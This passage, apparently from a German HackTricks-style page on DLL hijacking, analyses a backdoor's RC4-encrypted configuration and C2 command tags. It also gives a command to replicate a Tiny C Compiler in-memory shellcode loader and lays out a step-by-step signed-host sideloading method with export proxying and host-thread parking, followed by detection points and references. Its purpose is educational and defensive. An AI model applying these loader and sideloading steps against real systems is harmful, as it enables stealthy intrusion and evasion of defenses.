- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Exporttabelle in 4-Byte-Blöcken mit Murmur-ähnlichem Mixing verarbeitet und nur dann auf `GetProcAddress` zurückgreift, wenn der Hash nicht gefunden wird.

Eingebettete Konfiguration & C2
- Die Konfiguration befindet sich in der abgelegten Datei `BluetoothService` bei **Offset 0x30808** (Größe **0x980**) und wird mit dem Schlüssel `qwhvb^435h&*7` per RC4 entschlüsselt, wodurch die C2-URL und der User-Agent sichtbar werden.
- Beacons erstellen ein durch Punkte getrenntes Host-Profil, stellen das Tag `4Q` voran und verschlüsseln es anschließend mit dem Schlüssel `vAuig34%^325hGV` per RC4, bevor es über HTTPS an `HttpSendRequestA` übergeben wird. Antworten werden per RC4 entschlüsselt und anhand eines Tag-Switches verarbeitet (`4T` Shell, `4V` Prozessausführung, `4W/4X` Dateischreiben, `4Y` Lesen/Exfiltration, `4\\` Deinstallation, `4` Laufwerks-/Datei-Auflistung + Fälle für blockweise Übertragung).
- Der Ausführungsmodus wird durch CLI-Argumente gesteuert: keine Argumente = Persistenz installieren (Dienst/Run-Schlüssel), die auf `-i` verweist; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt die Payload aus.

Beobachteter alternativer Loader
- Bei demselben Einbruch wurden Tiny C Compiler abgelegt und `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` ausgeführt; `libtcc.dll` lag daneben. Der vom Angreifer bereitgestellte C-Quellcode enthielt Shellcode, wurde kompiliert und im Arbeitsspeicher ausgeführt, ohne eine PE-Datei auf die Festplatte zu schreiben. Replizieren Sie dies mit:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Diese TCC-basierte Compile-and-Run-Phase importierte `Wininet.dll` zur Laufzeit und lud Shellcode der zweiten Stufe von einer fest codierten URL herunter. So entstand ein flexibler Loader, der sich als Compilerlauf tarnte.

## Signed-Host-Sideloading mit Export-Proxying und Host-Thread-Parking

Einige DLL-Sideloading-Ketten setzen auf **Stability Engineering**, damit der legitime Host lange genug aktiv bleibt, um spätere Stufen sauber zu laden, statt nach dem Laden der bösartigen DLL abzustürzen.<sup>[[11]](#references)</sup>

Beobachtetes Muster
- Eine vertrauenswürdige EXE neben einer bösartigen DLL ablegen, die den erwarteten Abhängigkeitsnamen trägt, zum Beispiel `version.dll`.
- Die bösartige DLL **leitet alle erwarteten Exporte** an die echte System-DLL weiter (zum Beispiel `%SystemRoot%\\System32\\version.dll`), sodass die Auflösung der Importe weiterhin gelingt und der Host-Prozess funktionsfähig bleibt.
- Nach dem Laden **patcht die bösartige DLL den Einstiegspunkt des Hosts**, sodass der Hauptthread in eine Endlosschleife mit `Sleep` gerät, statt den Prozess zu beenden oder Codepfade auszuführen, die ihn beenden würden.
- Ein neuer Thread führt die eigentliche bösartige Aktion aus: Er entschlüsselt den Namen oder Pfad der nächsten DLL-Stufe (RC4/XOR sind üblich) und startet sie dann mit `LoadLibrary`.

Warum das wichtig ist
- Normales DLL-Proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug für spätere Stufen aktiv bleibt.
- Den Hauptthread mit `Sleep(INFINITE)` anzuhalten, ist eine einfache Möglichkeit, den signierten Prozess am Leben zu halten, während der Loader in einem Worker-Thread Entschlüsselung, Staging oder den Netzwerk-Bootstrap durchführt.
- Wer nur nach einer verdächtigen `DllMain` sucht, kann dieses Muster übersehen, wenn das auffällige Verhalten erst auftritt, nachdem der Einstiegspunkt des Hosts gepatcht wurde und ein sekundärer Thread startet.

Minimaler Ablauf
1. Die signierte Host-EXE kopieren und ermitteln, welche DLL sie aus dem lokalen Verzeichnis lädt.
2. Eine Proxy-DLL erstellen, die dieselben Funktionen exportiert und an die legitime DLL weiterleitet.
3. In `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread erstellen.
4. Von diesem Thread aus den Einstiegspunkt des Hosts oder die Startfunktion des Hauptthreads so patchen, dass er eine Schleife mit `Sleep` ausführt.
5. Den Namen/die Konfiguration der nächsten DLL-Stufe entschlüsseln und `LoadLibrary` aufrufen oder die Payload manuell in den Speicher abbilden.

Ansatzpunkte für die Abwehr
- Signierte Prozesse, die `version.dll` oder ähnlich verbreitete Bibliotheken aus ihrem eigenen Anwendungsverzeichnis statt aus `System32` laden.
- Speicher-Patches am Prozesseinstiegspunkt kurz nach dem Laden des Images, insbesondere Sprünge/Aufrufe, die zu `Sleep`/`SleepEx` umgeleitet werden.
- Von einer Proxy-DLL erstellte Threads, die unmittelbar `LoadLibrary` mit einer entschlüsselten DLL-Bezeichnung aufrufen.
- Vollständige Export-Proxy-DLLs neben Hersteller-Executables in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden.

## References

- [1] [Red Canary – Erkenntnisse zur Bedrohungslage: Januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – Rechteausweitung mithilfe von TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL-Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL-Hijacking in Windows: einfaches C-Beispiel](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore setzt neue Malware gegen Europa ein](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wenn DLL-Hijacks auf Windows-Hilfsprogramme treffen](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale Doppelgänger: Anatomie sich wandelnder Identitätsbetrugskampagnen zur Verbreitung von Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zusammenlaufende Interessen: Analyse von Bedrohungsclustern, die eine südostasiatische Regierung ins Visier nehmen](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Im Inneren von Ink Dragon: Das Relay-Netzwerk und die Funktionsweise einer verdeckten offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis-Backdoor: Ein tiefer Einblick in das Toolkit von Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: ZipSlip-zu-DLL-Hijack-Kette](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Verfolgung der Spionagekampagnen von Screen Serpens, einer iranischen APT, im Jahr 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Schnell und rücksichtslos: Operationen von Nimbus Manticore während des iranischen Konflikts](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Aufgabenaktionen](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 nimmt südostasiatische Regierungen und kritische Infrastruktur ins Visier](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Rekonstruktion und Erkennung von Windows-DLL-Suchreihenfolge-Hijacking mit Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Erstellen nativer Bibliotheken mit Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native Exporte mit Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE-Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Aufdeckung einer in legitimer Software eingebetteten SectopRAT-Variante](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Die LIGHTSHOW stehlen (Teil Eins)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – Das XAML-basierte .NET-Ladeframework NetamLoader](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
